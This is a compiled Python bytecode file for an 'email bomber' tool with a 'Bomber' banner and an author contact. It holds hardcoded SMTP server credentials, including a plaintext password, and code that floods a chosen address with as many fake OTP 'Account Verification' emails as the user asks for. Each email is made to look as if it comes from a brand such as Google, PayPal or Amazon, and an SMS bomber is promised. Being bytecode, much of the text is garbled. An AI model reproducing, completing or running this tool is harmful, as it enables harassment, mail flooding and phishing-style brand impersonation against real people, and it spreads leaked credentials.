�                   �   � d dl Z d dlZd dlZd dlmZ d dlmZ d dlZd dlZd dlZd� Z	dZ
dZdZdZd	� Zg d
�Zd� Zd� Zedk(  r e�        e y)�    N)�MIMEText)�MIMEMultipartc                  ��  � t        j                  t         j                  dk(  rdnd�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d	�       t        d
�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t        d�       t	        j
                  d�       y )N�nt�cls�clearz
[1;31;40ma$  
  ____                  _               
 |  _ \                | |              
 | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |_) | (_) | | | | | | |_) |  __/ |   
 |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                        
    z[0mz
[1;32;40mu�   ╔═════════════════════════════════════════╗u=   [1;34;40m║ [1;33;40mAuthor Name : Babar Ali[1;34;40m ║uE   [1;34;40m║ [1;33;40mWhatsapp Number : +923000448415[1;34;40m ║u�   ╚═════════════════════════════════════════╝z
[1;33;40mzWelcome to the Bomber ToolzChoose an option:z1. Email Bomberz!2. SMS Bomber (under development)z3. Exit�   )�os�system�name�print�time�sleep� �    �
sent.py.py�print_hacker_bannerr      s�   � ��I�I�r�w�w�$��e�G�4�	�/��	� � 	� 
�)�� 
�/��	�  N�  O�	�
�  A�	�  H�  I�	�  N�  O�	�)��	�/��	�
&�'�	�
��	�
��	�
-�.�	�)��	�)���J�J�q�Mr   zmail.royalearninghub.clickiK  znoreply@royalearninghub.clickz+bUtR?g=)p+2c                  �n   � dj                  t        j                  t        j                  d��      �      } | S )N� �   )�k)�join�random�choices�string�digits)�otps    r   �generate_otpr   1   s$   � �
�'�'�&�.�.����!�4�
5�C��Jr   )o�TechCorp�FinSolve�InnoSys�XenoTech�GlobalXzSoftWare Solutionsz
Alpha Inc.�WhatsApp�Facebook�	Instagram�Google�Amazon�Apple�	Microsoft�Twitter�Snapchat�LinkedIn�YouTube�TikTok�	Pinterest�Reddit�Spotify�Netflix�Uber�Airbnb�PayPal�eBay�Shopify�Slack�Zoom�Dropbox�
Salesforce�Tesla�SpaceX�Dell�HP�Lenovo�Asus�Nvidia�AMD�Intel�Qualcomm�Cisco�Samsung�Huawei�Sony�LG�	Panasonic�Bose�Fitbit�GoPro�Nikon�Canon�Fujifilm�Adobe�Autodesk�VMware�Oracle�SAPzAdobe Systemsr2   r0   r2   �	WordPress�TrellozZoom Video Communications�GitHub�	Bitbucket�GitLab�Docker�
Kubernetes�	Atlassianr8   �Striper5   z	Uber Eats�GrubHub�DoorDash�	Instacart�	Postmates�WeWorkzSlack Technologies�Xero�Squarespace�BigCommerce�Wix�Bluehost�GoDaddyr8   �Vimeo�Yelp�ExpediazBooking.com�Hulu�Disney�WarnerMedia�Fox�NBCUniversal�CNN�BBCzThe New York TimeszThe Washington Post�	Bloomberg�ForbeszMcKinsey & CompanyzBoston Consulting Group�Deloitte�PwCzErnst & Young�KPMG�	Accenturec                 �`  � d}d}t        |�      D ]�  }t        j                  t        �      }t	        �       }d|� �}d|� d|� d�}t        �       }	t        |	d<   | |	d<   ||	d<   |	j                  t        |d	�      �       	 t        j                  t        t        �      }
|
j                  �        |
j                  t        t        �       |
j!                  t        | |	j#                  �       �       |
j%                  �        |d
z  }t'        d| � ��       �� t'        d|� ��       t'        d|� ��       t'        d�       t'        d�       t'        d�       t+        d�      }|dk(  ry|dk(  rt-        �        y t'        d�       t-        �        y # t(        $ r!}|d
z  }t'        d| � d|� ��       Y d }~���d }~ww xY w)Nr   zAccount Verification - z?Hello,

Please verify your account using the following OTP for z:

OTP: z"

Thank you for using our service!�From�To�Subject�plainr	   zEmail sent successfully to zFailed to send email to z: z
Emails sent successfully: zEmails failed to send: z
Choose an option:z1. Backz2. Exit�Enter your choice: �1T�2zInvalid choice! Exiting...)�ranger   �choice�	companiesr   r   �SENDER_EMAIL�attachr   �smtplib�SMTP�SMTP_SERVER�	SMTP_PORT�starttls�login�SENDER_PASSWORD�sendmail�	as_string�quitr   �	Exception�input�exit)�receiver_email�
num_emails�success_count�failure_count�_�companyr   �subject�body�message�server�er�   s                r   �
send_emailr�   G   s�  � ��M��M� �:����-�-�	�*���n�� ,�G�9�5��R�SZ�R[�[e�fi�ej�  kO�  P��  �/��&����&����$��	�����x��g�.�/�
	D��\�\�+�y�9�F��O�O���L�L���7��O�O�L�.�'�:K�:K�:M�N��K�K�M��Q��M��/��/?�@�A�1 �< 
�(���
8�9�	�#�M�?�
3�4� 
�
� �	�)��	�)���(�)�F���}��	�3�����*�+����) � 	D��Q��M��,�^�,<�B�q�c�B�C�C��	D�s   �=BF�	F-�F(�(F-c                  �T  � 	 t        �        t        d�      } | dk(  r,t        d�      }t        t        d�      �      }t        ||�       na| dk(  r!t	        d�       t        j                  d�       n;| dk(  rt	        d	�       t        �        n t	        d
�       t        j                  d�       ��)Nr�   r�   z$Enter the receiver's email address: z$Enter the number of emails to send: r�   z)SMS Bomber (Dummy) is under construction.r	   �3zExiting program...z!Invalid choice! Please try again.)r   r�   �intr�   r   r   r   r�   )r�   r�   r�   s      r   �mainr�   |   s�   � �
����,�-���S�=�"�#I�J�N��U�#I�J�K�J��~�z�2��s�]��=�>��J�J�q�M��s�]��&�'��F��5�6��J�J�q�M�! r   �__main__)r�   r   r   �email.mime.textr   �email.mime.multipartr   r
   r   r   r�   r�   r�   r�   r   r�   r�   r�   �__name__�Dr   r   r   �<module>r�      sb   �� � � � $� .� 	� � ��@ +���	�.�� ���
�	�"2�j�( �z���F� r   